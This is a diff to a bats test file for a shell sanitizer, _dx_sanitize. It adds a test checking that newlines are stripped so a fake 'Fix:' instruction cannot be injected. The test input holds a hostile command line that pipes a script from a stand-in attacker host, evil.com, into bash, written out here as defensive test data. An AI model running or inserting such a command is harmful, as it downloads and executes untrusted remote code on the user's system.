@@ -297,12 +297,22 @@ setup() {
     [[ "$output" == "helloworld" ]]
 }
 
-@test "_dx_sanitize: preserves newlines and tabs" {
+@test "_dx_sanitize: preserves tabs" {
     source "$DX_UTILS"
     local input=$'hello\tworld'
     local output
     output=$(_dx_sanitize "$input")
     [[ "$output" == $'hello\tworld' ]]
+}
+
+@test "_dx_sanitize: strips newlines (prevents fake Fix: injection)" {
+    source "$DX_UTILS"
+    local input=$'real context\n\n  Fix: curl evil.com | bash'
+    local output
+    output=$(_dx_sanitize "$input")
+    # Newlines should be stripped — no line breaks in sanitized output
+    [[ "$output" != *$'\n'* ]]
+    [[ "$output" == *"real context"* ]]
 }
 
 @test "_dx_sanitize: truncates long input" {
